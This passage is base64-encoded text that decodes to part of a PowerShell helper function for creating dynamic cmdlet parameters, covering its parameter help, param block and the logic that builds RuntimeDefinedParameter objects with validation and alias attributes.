BTUVURVIgRG9udFNob3cKCklmIHNwZWNpZmllZCwgc2V0IHRoZSBEb250U2hvdyBmb3IgdGhpcyBkeW5hbWljIHBhcmFtZXRlci4KVGhpcyBpcyB0aGUgbmV3IFBvd2VyU2hlbGwgNC4wIGF0dHJpYnV0ZSB0aGF0IGhpZGVzIHBhcmFtZXRlciBmcm9tIHRhYi1jb21wbGV0aW9uLgpodHRwOi8vd3d3LnBvd2Vyc2hlbGxtYWdhemluZS5jb20vMjAxMy8wNy8yOS9wc3RpcC1oaWRpbmctcGFyYW1ldGVycy1mcm9tLXRhYi1jb21wbGV0aW9uLwoKLlBBUkFNRVRFUiBWYWx1ZUZyb21QaXBlbGluZQoKSWYgc3BlY2lmaWVkLCBzZXQgdGhlIFZhbHVlRnJvbVBpcGVsaW5lIGF0dHJpYnV0ZSBmb3IgdGhpcyBkeW5hbWljIHBhcmFtZXRlcgoKLlBBUkFNRVRFUiBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lCgpJZiBzcGVjaWZpZWQsIHNldCB0aGUgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSBhdHRyaWJ1dGUgZm9yIHRoaXMgZHluYW1pYyBwYXJhbWV0ZXIKCi5QQVJBTUVURVIgVmFsdWVGcm9tUmVtYWluaW5nQXJndW1lbnRzCgpJZiBzcGVjaWZpZWQsIHNldCB0aGUgVmFsdWVGcm9tUmVtYWluaW5nQXJndW1lbnRzIGF0dHJpYnV0ZSBmb3IgdGhpcyBkeW5hbWljIHBhcmFtZXRlcgoKLlBBUkFNRVRFUiBQYXJhbWV0ZXJTZXROYW1lCgpJZiBzcGVjaWZpZWQsIHNldCB0aGUgUGFyYW1ldGVyU2V0IGF0dHJpYnV0ZSBmb3IgdGhpcyBkeW5hbWljIHBhcmFtZXRlci4gQnkgZGVmYXVsdCBwYXJhbWV0ZXIgaXMgYWRkZWQgdG8gYWxsIHBhcmFtZXRlcnMgc2V0cy4KCi5QQVJBTUVURVIgQWxsb3dOdWxsCgpJZiBzcGVjaWZpZWQsIHNldCB0aGUgQWxsb3dOdWxsIGF0dHJpYnV0ZSBvZiB0aGlzIGR5bmFtaWMgcGFyYW1ldGVyCgouUEFSQU1FVEVSIEFsbG93RW1wdHlTdHJpbmcKCklmIHNwZWNpZmllZCwgc2V0IHRoZSBBbGxvd0VtcHR5U3RyaW5nIGF0dHJpYnV0ZSBvZiB0aGlzIGR5bmFtaWMgcGFyYW1ldGVyCgouUEFSQU1FVEVSIEFsbG93RW1wdHlDb2xsZWN0aW9uCgpJZiBzcGVjaWZpZWQsIHNldCB0aGUgQWxsb3dFbXB0eUNvbGxlY3Rpb24gYXR0cmlidXRlIG9mIHRoaXMgZHluYW1pYyBwYXJhbWV0ZXIKCi5QQVJBTUVURVIgVmFsaWRhdGVOb3ROdWxsCgpJZiBzcGVjaWZpZWQsIHNldCB0aGUgVmFsaWRhdGVOb3ROdWxsIGF0dHJpYnV0ZSBvZiB0aGlzIGR5bmFtaWMgcGFyYW1ldGVyCgouUEFSQU1FVEVSIFZhbGlkYXRlTm90TnVsbE9yRW1wdHkKCklmIHNwZWNpZmllZCwgc2V0IHRoZSBWYWxpZGF0ZU5vdE51bGxPckVtcHR5IGF0dHJpYnV0ZSBvZiB0aGlzIGR5bmFtaWMgcGFyYW1ldGVyCgouUEFSQU1FVEVSIFZhbGlkYXRlUmFuZ2UKCklmIHNwZWNpZmllZCwgc2V0IHRoZSBWYWxpZGF0ZVJhbmdlIGF0dHJpYnV0ZSBvZiB0aGlzIGR5bmFtaWMgcGFyYW1ldGVyCgouUEFSQU1FVEVSIFZhbGlkYXRlTGVuZ3RoCgpJZiBzcGVjaWZpZWQsIHNldCB0aGUgVmFsaWRhdGVMZW5ndGggYXR0cmlidXRlIG9mIHRoaXMgZHluYW1pYyBwYXJhbWV0ZXIKCi5QQVJBTUVURVIgVmFsaWRhdGVQYXR0ZXJuCgpJZiBzcGVjaWZpZWQsIHNldCB0aGUgVmFsaWRhdGVQYXR0ZXJuIGF0dHJpYnV0ZSBvZiB0aGlzIGR5bmFtaWMgcGFyYW1ldGVyCgouUEFSQU1FVEVSIFZhbGlkYXRlU2NyaXB0CgpJZiBzcGVjaWZpZWQsIHNldCB0aGUgVmFsaWRhdGVTY3JpcHQgYXR0cmlidXRlIG9mIHRoaXMgZHluYW1pYyBwYXJhbWV0ZXIKCi5QQVJBTUVURVIgVmFsaWRhdGVTZXQKCklmIHNwZWNpZmllZCwgc2V0IHRoZSBWYWxpZGF0ZVNldCBhdHRyaWJ1dGUgb2YgdGhpcyBkeW5hbWljIHBhcmFtZXRlcgoKLlBBUkFNRVRFUiBEaWN0aW9uYXJ5CgpJZiBzcGVjaWZpZWQsIGFkZCByZXN1bHRpbmcgUnVudGltZURlZmluZWRQYXJhbWV0ZXIgdG8gYW4gZXhpc3RpbmcgUnVudGltZURlZmluZWRQYXJhbWV0ZXJEaWN0aW9uYXJ5LgpBcHByb3ByaWF0ZSBmb3IgY3VzdG9tIGR5bmFtaWMgcGFyYW1ldGVycyBjcmVhdGlvbi4KCklmIG5vdCBzcGVjaWZpZWQsIGNyZWF0ZSBhbmQgcmV0dXJuIGEgUnVudGltZURlZmluZWRQYXJhbWV0ZXJEaWN0aW9uYXJ5CkFwcHJvcHJpYXRlIGZvciBhIHNpbXBsZSBkeW5hbWljIHBhcmFtZXRlciBjcmVhdGlvbi4KIz4KCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkdHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtzdHJpbmddJE5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbU3lzdGVtLlR5cGVdJFR5cGUgPSBbaW50XSwKCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJHRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnRHluYW1pY1BhcmFtZXRlcicpXQogICAgICAgIFtzdHJpbmdbXV0kQWxpYXMsCgogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbc3dpdGNoXSRNYW5kYXRvcnksCgogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbaW50XSRQb3NpdGlvbiwKCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJHRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnRHluYW1pY1BhcmFtZXRlcicpXQogICAgICAgIFtzdHJpbmddJEhlbHBNZXNzYWdlLAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW3N3aXRjaF0kRG9udFNob3csCgogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbc3dpdGNoXSRWYWx1ZUZyb21QaXBlbGluZSwKCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJHRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnRHluYW1pY1BhcmFtZXRlcicpXQogICAgICAgIFtzd2l0Y2hdJFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbc3dpdGNoXSRWYWx1ZUZyb21SZW1haW5pbmdBcmd1bWVudHMsCgogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbc3RyaW5nXSRQYXJhbWV0ZXJTZXROYW1lID0gJ19fQWxsUGFyYW1ldGVyU2V0cycsCgogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbc3dpdGNoXSRBbGxvd051bGwsCgogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbc3dpdGNoXSRBbGxvd0VtcHR5U3RyaW5nLAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW3N3aXRjaF0kQWxsb3dFbXB0eUNvbGxlY3Rpb24sCgogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbc3dpdGNoXSRWYWxpZGF0ZU5vdE51bGwsCgogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbc3dpdGNoXSRWYWxpZGF0ZU5vdE51bGxPckVtcHR5LAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW1ZhbGlkYXRlQ291bnQoMiwyKV0KICAgICAgICBbaW50W11dJFZhbGlkYXRlQ291bnQsCgogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbVmFsaWRhdGVDb3VudCgyLDIpXQogICAgICAgIFtpbnRbXV0kVmFsaWRhdGVSYW5nZSwKCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJHRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnRHluYW1pY1BhcmFtZXRlcicpXQogICAgICAgIFtWYWxpZGF0ZUNvdW50KDIsMildCiAgICAgICAgW2ludFtdXSRWYWxpZGF0ZUxlbmd0aCwKCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJHRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnRHluYW1pY1BhcmFtZXRlcicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW3N0cmluZ10kVmFsaWRhdGVQYXR0ZXJuLAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbc2NyaXB0YmxvY2tdJFZhbGlkYXRlU2NyaXB0LAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbc3RyaW5nW11dJFZhbGlkYXRlU2V0LAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbVmFsaWRhdGVTY3JpcHQoewogICAgICAgICAgICBpZighKCRfIC1pcyBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW50aW1lRGVmaW5lZFBhcmFtZXRlckRpY3Rpb25hcnldKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgJ0RpY3Rpb25hcnkgbXVzdCBiZSBhIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVudGltZURlZmluZWRQYXJhbWV0ZXJEaWN0aW9uYXJ5IG9iamVjdCcKICAgICAgICAgICAgfQogICAgICAgICAgICAkdHJ1ZQogICAgICAgIH0pXQogICAgICAgICREaWN0aW9uYXJ5ID0gJGZhbHNlLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJHRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnQ3JlYXRlVmFyaWFibGVzJyldCiAgICAgICAgW3N3aXRjaF0kQ3JlYXRlVmFyaWFibGVzLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJHRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnQ3JlYXRlVmFyaWFibGVzJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbVmFsaWRhdGVTY3JpcHQoewogICAgICAgICAgICAjIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNCb3VuZFBhcmFtZXRlcnNEaWN0aW9uYXJ5IGlzIGFuIGludGVybmFsIHNlYWxlZCBjbGFzcywKICAgICAgICAgICAgIyBzbyBvbmUgY2FuJ3QgdXNlIFBvd2VyU2hlbGwncyAnLWlzJyBvcGVyYXRvciB0byB2YWxpZGF0ZSB0eXBlLgogICAgICAgICAgICBpZigkXy5HZXRUeXBlKCkuTmFtZSAtbm90bWF0Y2ggJ0RpY3Rpb25hcnknKSB7CiAgICAgICAgICAgICAgICBUaHJvdyAnQm91bmRQYXJhbWV0ZXJzIG11c3QgYmUgYSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQm91bmRQYXJhbWV0ZXJzRGljdGlvbmFyeSBvYmplY3QnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHRydWUKICAgICAgICB9KV0KICAgICAgICAkQm91bmRQYXJhbWV0ZXJzCiAgICApCgogICAgQmVnaW4gewogICAgICAgICRJbnRlcm5hbERpY3Rpb25hcnkgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnRpbWVEZWZpbmVkUGFyYW1ldGVyRGljdGlvbmFyeQogICAgICAgIGZ1bmN0aW9uIF90ZW1wIHsgW0NtZGxldEJpbmRpbmcoKV0gUGFyYW0oKSB9CiAgICAgICAgJENvbW1vblBhcmFtZXRlcnMgPSAoR2V0LUNvbW1hbmQgX3RlbXApLlBhcmFtZXRlcnMuS2V5cwogICAgfQoKICAgIFByb2Nlc3MgewogICAgICAgIGlmKCRDcmVhdGVWYXJpYWJsZXMpIHsKICAgICAgICAgICAgJEJvdW5kS2V5cyA9ICRCb3VuZFBhcmFtZXRlcnMuS2V5cyB8IFdoZXJlLU9iamVjdCB7ICRDb21tb25QYXJhbWV0ZXJzIC1ub3Rjb250YWlucyAkXyB9CiAgICAgICAgICAgIEZvckVhY2goJFBhcmFtZXRlciBpbiAkQm91bmRLZXlzKSB7CiAgICAgICAgICAgICAgICBpZiAoJFBhcmFtZXRlcikgewogICAgICAgICAgICAgICAgICAgIFNldC1WYXJpYWJsZSAtTmFtZSAkUGFyYW1ldGVyIC1WYWx1ZSAkQm91bmRQYXJhbWV0ZXJzLiRQYXJhbWV0ZXIgLVNjb3BlIDEgLUZvcmNlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRTdGFsZUtleXMgPSBAKCkKICAgICAgICAgICAgJFN0YWxlS2V5cyA9ICRQU0JvdW5kUGFyYW1ldGVycy5HZXRFbnVtZXJhdG9yKCkgfAogICAgICAgICAgICAgICAgICAgICAgICBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkXy5WYWx1ZS5QU29iamVjdC5NZXRob2RzLk5hbWUgLW1hdGNoICdeRXF1YWxzJCcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIElmIG9iamVjdCBoYXMgRXF1YWxzLCBjb21wYXJlIGJvdW5kIGtleSBhbmQgdmFyaWFibGUgdXNpbmcgaXQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZighJF8uVmFsdWUuRXF1YWxzKChHZXQtVmFyaWFibGUgLU5hbWUgJF8uS2V5IC1WYWx1ZU9ubHkgLVNjb3BlIDApKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXy5LZXkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIElmIG9iamVjdCBkb2Vzbid0IGhhcyBFcXVhbHMgKGUuZy4gJG51bGwpLCBmYWxsYmFjayB0byB0aGUgUG93ZXJTaGVsbCdzIC1uZSBvcGVyYXRvcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRfLlZhbHVlIC1uZSAoR2V0LVZhcmlhYmxlIC1OYW1lICRfLktleSAtVmFsdWVPbmx5IC1TY29wZSAwKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXy5LZXkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoJFN0YWxlS2V5cykgewogICAgICAgICAgICAgICAgJFN0YWxlS2V5cyB8IEZvckVhY2gtT2JqZWN0IHtbdm9pZF0kUFNCb3VuZFBhcmFtZXRlcnMuUmVtb3ZlKCRfKX0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBTaW5jZSB3ZSByZWx5IHNvbGVseSBvbiAkUFNCb3VuZFBhcmFtZXRlcnMsIHdlIGRvbid0IGhhdmUgYWNjZXNzIHRvIGRlZmF1bHQgdmFsdWVzIGZvciB1bmJvdW5kIHBhcmFtZXRlcnMKICAgICAgICAgICAgJFVuYm91bmRQYXJhbWV0ZXJzID0gKEdldC1Db21tYW5kIC1OYW1lICgkUFNDbWRsZXQuTXlJbnZvY2F0aW9uLkludm9jYXRpb25OYW1lKSkuUGFyYW1ldGVycy5HZXRFbnVtZXJhdG9yKCkgIHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgRmluZCBwYXJhbWV0ZXJzIHRoYXQgYXJlIGJlbG9uZyB0byB0aGUgY3VycmVudCBwYXJhbWV0ZXIgc2V0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5WYWx1ZS5QYXJhbWV0ZXJTZXRzLktleXMgLWNvbnRhaW5zICRQc0NtZGxldC5QYXJhbWV0ZXJTZXROYW1lIH0gfAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IEtleSB8CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgRmluZCB1bmJvdW5kIHBhcmFtZXRlcnMgaW4gdGhlIGN1cnJlbnQgcGFyYW1ldGVyIHNldAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXaGVyZS1PYmplY3QgeyAkUFNCb3VuZFBhcmFtZXRlcnMuS2V5cyAtbm90Y29udGFpbnMgJF8gfQoKICAgICAgICAgICAgIyBFdmVuIGlmIHBhcmFtZXRlciBpcyBub3QgYm91bmQsIGNvcnJlc3BvbmRpbmcgdmFyaWFibGUgaXMgY3JlYXRlZCB3aXRoIHBhcmFtZXRlcidzIGRlZmF1bHQgdmFsdWUgKGlmIHNwZWNpZmllZCkKICAgICAgICAgICAgJHRtcCA9ICRudWxsCiAgICAgICAgICAgIEZvckVhY2ggKCRQYXJhbWV0ZXIgaW4gJFVuYm91bmRQYXJhbWV0ZXJzKSB7CiAgICAgICAgICAgICAgICAkRGVmYXVsdFZhbHVlID0gR2V0LVZhcmlhYmxlIC1OYW1lICRQYXJhbWV0ZXIgLVZhbHVlT25seSAtU2NvcGUgMAogICAgICAgICAgICAgICAgaWYoISRQU0JvdW5kUGFyYW1ldGVycy5UcnlHZXRWYWx1ZSgkUGFyYW1ldGVyLCBbcmVmXSR0bXApIC1hbmQgJERlZmF1bHRWYWx1ZSkgewogICAgICAgICAgICAgICAgICAgICRQU0JvdW5kUGFyYW1ldGVycy4kUGFyYW1ldGVyID0gJERlZmF1bHRWYWx1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkRGljdGlvbmFyeSkgewogICAgICAgICAgICAgICAgJERQRGljdGlvbmFyeSA9ICREaWN0aW9uYXJ5CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkRFBEaWN0aW9uYXJ5ID0gJEludGVybmFsRGljdGlvbmFyeQogICAgICAgICAgICB9CgogICAgICAgICAgICAjIFNob3J0Y3V0IGZvciBnZXR0aW5nIGxvY2FsIHZhcmlhYmxlcwogICAgICAgICAgICAkR2V0VmFyID0ge0dldC1WYXJpYWJsZSAtTmFtZSAkXyAtVmFsdWVPbmx5IC1TY29wZSAwfQoKICAgICAgICAgICAgIyBTdHJpbmdzIHRvIG1hdGNoIGF0dHJpYnV0ZXMgYW5kIHZhbGlkYXRpb24gYXJndW1lbnRzCiAgICAgICAgICAgICRBdHRyaWJ1dGVSZWdleCA9ICdeKE1hbmRhdG9yeXxQb3NpdGlvbnxQYXJhbWV0ZXJTZXROYW1lfERvbnRTaG93fEhlbHBNZXNzYWdlfFZhbHVlRnJvbVBpcGVsaW5lfFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWV8VmFsdWVGcm9tUmVtYWluaW5nQXJndW1lbnRzKSQnCiAgICAgICAgICAgICRWYWxpZGF0aW9uUmVnZXggPSAnXihBbGxvd051bGx8QWxsb3dFbXB0eVN0cmluZ3xBbGxvd0VtcHR5Q29sbGVjdGlvbnxWYWxpZGF0ZUNvdW50fFZhbGlkYXRlTGVuZ3RofFZhbGlkYXRlUGF0dGVybnxWYWxpZGF0ZVJhbmdlfFZhbGlkYXRlU2NyaXB0fFZhbGlkYXRlU2V0fFZhbGlkYXRlTm90TnVsbHxWYWxpZGF0ZU5vdE51bGxPckVtcHR5KSQnCiAgICAgICAgICAgICRBbGlhc1JlZ2V4ID0gJ15BbGlhcyQnCiAgICAgICAgICAgICRQYXJhbWV0ZXJBdHRyaWJ1dGUgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBhcmFtZXRlckF0dHJpYnV0ZQoKICAgICAgICAgICAgc3dpdGNoIC1yZWdleCAoJFBTQm91bmRQYXJhbWV0ZXJzLktleXMpIHsKICAgICAgICAgICAgICAgICRBdHRyaWJ1dGVSZWdleCB7CiAgICAgICAgICAgICAgICAgICAgVHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgJFBhcmFtZXRlckF0dHJpYnV0ZS4kXyA9IC4gJEdldFZhcgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBDYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRfCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmKCREUERpY3Rpb25hcnkuS2V5cyAtY29udGFpbnMgJE5hbWUpIHsKICAgICAgICAgICAgICAgICREUERpY3Rpb25hcnkuJE5hbWUuQXR0cmlidXRlcy5BZGQoJFBhcmFtZXRlckF0dHJpYnV0ZSkKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRBdHRyaWJ1dGVDb2xsZWN0aW9uID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgQ29sbGVjdGlvbnMuT2JqZWN0TW9kZWwuQ29sbGVjdGlvbltTeXN0ZW0uQXR0cmlidXRlXQogICAgICAgICAgICAgICAgc3dpdGNoIC1yZWdleCAoJFBTQm91bmRQYXJhbWV0ZXJzLktleXMpIHsKICAgICAgICAgICAgICAgICAgICAkVmFsaWRhdGlvblJlZ2V4IHsKICAgICAgICAgICAgICAgICAgICAgICAgVHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQYXJhbWV0ZXJPcHRpb25zID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgIlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uJHtffUF0dHJpYnV0ZSIgLUFyZ3VtZW50TGlzdCAoLiAkR2V0VmFyKSAtRXJyb3JBY3Rpb24gU3RvcAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEF0dHJpYnV0ZUNvbGxlY3Rpb24uQWRkKCRQYXJhbWV0ZXJPcHRpb25zKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIENhdGNoIHsgJF8gfQogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkQWxpYXNSZWdleCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUGFyYW1ldGVyQWxpYXMgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFsaWFzQXR0cmlidXRlIC1Bcmd1bWVudExpc3QgKC4gJEdldFZhcikgLUVycm9yQWN0aW9uIFN0b3AKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBdHRyaWJ1dGVDb2xsZWN0aW9uLkFkZCgkUGFyYW1ldGVyQWxpYXMpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIENhdGNoIHsgJF8gfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRBdHRyaWJ1dGVDb2xsZWN0aW9uLkFkZCgkUGFyYW1ldGVyQXR0cmlidXRlKQogICAgICAgICAgICAgICAgJFBhcmFtZXRlciA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVudGltZURlZmluZWRQYX